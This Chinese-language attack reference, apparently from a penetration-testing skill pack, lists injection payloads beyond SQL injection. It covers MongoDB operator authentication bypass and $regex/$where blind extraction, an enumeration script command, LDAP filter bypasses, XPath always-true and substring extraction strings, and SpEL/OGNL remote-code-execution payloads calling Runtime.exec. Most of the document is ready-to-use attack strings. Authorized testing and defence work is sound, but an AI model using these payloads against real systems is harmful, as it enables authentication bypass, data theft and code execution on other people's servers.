# 扩展注入实战参考（NoSQL / LDAP / XPath / EL）

> 补 SQL 注入之外的注入家族。检测逻辑与 SQLi 相同：**确认可控输入进入了解析器并改变了语义**。
> 报告门槛与 SQLi 一致：必须提取到数据或绕过认证，仅报错不报。

## 1. NoSQL 注入（MongoDB 为主）

### 1.1 识别
- 指纹：响应含 `MongoError`/`BSON`；API 为 JSON 格式（Node.js/Express + Mongoose 高发）
- 快速探针：`?q[$ne]=1` / `{"$gt":""}` / 单引号观察报错差异

### 1.2 认证绕过（🔴高危，最常见）

```bash
# === URL 参数形式 ===
POST /login
username[$ne]=invalid&password[$ne]=invalid

# === JSON 形式 ===
{"username":{"$gt":""},"password":{"$gt":""}}
{"username":{"$regex":"^admin"},"password":{"$ne":""}}

# 验证标准：实际登录成功进入后台/拿到 Token，不是仅返回 200
```

### 1.3 数据提取（布尔/时间盲注）

```bash
# === $regex 逐字符提取密码/Token ===
{"username":"admin","password":{"$regex":"^a"}}     → 响应差异
{"username":"admin","password":{"$regex":"^ab"}}    → 逐位推进

# === $where 时间盲注（需服务端启用 JS 求值）===
{"username":"admin","$where":"this.password.match(/^a/)&&sleep(3000)||true"}

# 自动化:
python3 nosqli-user-pass-enum.py -u http://<target>/login -up username -pp password
# 或 Burp Intruder: 字符集 a-z0-9 → 按响应长度聚类
```

### 1.4 操作符速查
| 操作符 | 用途 |
|--------|------|
| `$ne` / `$gt` / `$regex` | 认证绕过、数据枚举 |
| `$where` | JS 注入 → 时间盲注/数据提取（多数默认禁用） |
| `$lookup` | 跨集合联合查询（聚合接口） |

## 2. LDAP 注入

### 2.1 识别与检测
- 场景：企业 SSO/AD 登录、目录搜索接口；报错含 `javax.naming` / `LDAP` / `Bad search filter`
- 探针：`*` / `)(|` / `%00` 观察响应差异

```bash
# === 认证绕过 ===
username=admin)(&)            # 拼成 (&(uid=admin)(&))(password=任意) → 恒真
username=*)(uid=*))(|(uid=*   # 通配绕过

# === 属性枚举 ===
*)(uid=*))(|(uid=a*           # 逐字符爆破用户名（响应差异）
```

## 3. XPath 注入

- 场景：XML 后端存储的老系统；报错含 `XPath` / `System.Xml`
- 认证绕过: `' or 1=1 or ''='` → `//user[name/text()='' or 1=1 or ''='' and pass...]`
- 盲注枚举: `' or substring(//user[1]/pass,1,1)='a` → 逐字符提取

## 4. 表达式语言注入（EL/OGNL/SpEL）

- 场景：Java 富客户端/框架参数；`${...}` `#{...}` 被服务端求值
- 与 SSTI 的区别：模板引擎之外的原生表达式求值，常出在参数名/头/错误页

```bash
# === 检测探针 ===
${7*7} / #{7*7} / ${{7*7}}        → 响应出现 49 即确认
*{7*7}                            # OGNL (Struts2)

# === RCE ===
#{T(java.lang.Runtime).getRuntime().exec('id')}     # SpEL
@java.lang.Runtime@getRuntime().exec('id')          # OGNL
```

> ⚠️ Struts2/Confluence 等 OGNL RCE 多为历史漏洞 — 优先走 SKILL.md Step 2a 指纹匹配流程，用公开 PoC 验证

## 相关参考

- SQL 注入全技法 → `web-sqli.md`
- 模板注入 SSTI → `web-ssti.md`（模板引擎求值）
- NoSQL 鉴权绕过速查 → `web-auth-logic.md §7.1`
